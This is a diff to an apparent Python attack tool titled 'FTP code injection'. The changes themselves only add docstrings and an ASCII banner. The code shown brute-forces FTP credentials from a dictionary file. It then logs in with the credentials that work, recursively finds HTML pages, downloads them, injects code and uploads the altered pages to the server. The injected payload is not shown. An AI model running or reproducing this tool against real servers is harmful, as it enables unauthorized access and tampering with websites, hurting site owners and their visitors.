@@ -26,6 +26,10 @@ def async_time(function: typing.Callable) -> typing.Callable[[tuple[typing.Any, 
 
 
 async def parse() -> typing.Tuple[str, str]:
+    """
+    Try command line parsing
+    :return: Tuple[str, str] (user, password)
+    """
     global CODE_INJECTION
     parser = argparse.ArgumentParser(description="FTP code injection")
     parser.add_argument("-i", "--ip", default="localhost", type=str)
@@ -41,6 +45,10 @@ async def parse() -> typing.Tuple[str, str]:
 
 
 async def read_file() -> typing.AsyncGenerator:
+    """
+    Read the dictionary [txt]
+    :return: None
+    """
     global IP_ADDRESS
     ip_address, file_name = await parse()
     IP_ADDRESS = ip_address
@@ -50,18 +58,26 @@ async def read_file() -> typing.AsyncGenerator:
 
 
 async def ftp_brute_force() -> None:
+    """
+    Read the dictionary and try to find the right credentials
+    :return: None
+    """
     print(colorama.Fore.GREEN + "[+] Testing credentials to connect ftp server...")
     async for line in read_file():
         response = await ftp_login(line)
         if response:
             user, password = line.split(':')
-            print(colorama.Fore.GREEN + f"[+] Successfully connected -> User:{user}"
-                                        f" Password:{password} ")
+            print(colorama.Fore.GREEN + f"[+] Successfully connected")
             await get_pages_from_ftp_server(user, password)
         print(colorama.Fore.CYAN + f"{REJECTEDS} Wrong credentials", end='\r')
 
 
 async def ftp_login(line: typing.AsyncGenerator) -> bool or typing.Tuple:
+    """
+    Login to ftp server
+    :param line: Tuple[str] user, password
+    :return: Tuple or bool
+    """
     global REJECTEDS
     user, password = str(line).split(":")
     ftp = ftplib.FTP()
@@ -76,7 +92,13 @@ async def ftp_login(line: typing.AsyncGenerator) -> bool or typing.Tuple:
         return True
 
 
-async def list_files(file: str, ftp: typing.Any) -> str:
+async def list_files(file: str, ftp: typing.Any) -> typing.Callable or str:
+    """
+    List files and identify html files, recursivily
+    :param file: str
+    :param ftp: instance
+    :return: Callable or str
+    """
     files = ftp.nlst(file)
     for f in files:
         if os.path.isdir(f):
@@ -88,6 +110,12 @@ async def list_files(file: str, ftp: typing.Any) -> str:
 
 
 async def get_pages_from_ftp_server(user: str, password: str) -> None:
+    """
+    List the ftp server
+    :param user: str
+    :param password: str
+    :return: None
+    """
     ftp = ftplib.FTP()
     try:
         ftp.connect(IP_ADDRESS, 21)
@@ -104,6 +132,12 @@ async def get_pages_from_ftp_server(user: str, password: str) -> None:
 
 
 async def overwrite_page(path: str, ftp) -> None:
+    """
+    Overwrite the page (inject the code)
+    :param path: str
+    :param ftp: instance
+    :return: None
+    """
     content = ''
     with open(path + '.modify', 'wb') as temp:  # use 'wb' mode for binary files
         ftp.retrbinary(f"RETR {path}", temp.write)
@@ -120,15 +154,21 @@ async def overwrite_page(path: str, ftp) -> None:
     print(colorama.Fore.GREEN + "[+] Sending to server...")
 
 
-
-
-
 @async_time
 async def main() -> None:
     await ftp_brute_force()
 
 
 if __name__ == '__main__':
+    print(colorama.Fore.LIGHTMAGENTA_EX + """
+    FTP INJECTION
+    .∧＿∧
+    ( ･ω･｡)つ━ ☠・☠。
+    ⊂　 ノ 　　　・゜☠.
+    しーＪ　　　°。☠ ☠´¨)
+    　　　　　　　　　.· ´¸.·☠´¨) ¸.·☠¨)
+    　　　　　　　　　　(¸.·´ (¸.·'☠ ☠By Marcus""")
+    time.sleep(2)
     try:
         start = asyncio.get_event_loop()
         start.run_until_complete(main())
